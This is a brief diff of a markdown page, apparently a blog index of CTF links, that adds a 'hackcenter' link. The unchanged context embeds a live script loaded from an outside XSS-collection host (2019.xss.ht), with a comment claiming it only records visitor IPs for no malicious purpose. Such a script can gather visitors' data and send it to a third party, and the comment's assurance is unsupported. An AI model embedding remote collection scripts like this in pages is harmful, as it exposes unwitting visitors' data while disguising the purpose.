@@ -3,6 +3,8 @@
 
 [hctf](/hctf/hctf "hctf")
 
+[hackcenter](/hackcenter/hackcenter "hackcenter")
+
 <script src="https://2019.xss.ht"> 
 </script>
 <!-- for recording every IP visiting my blog only, no malicious purpose -->
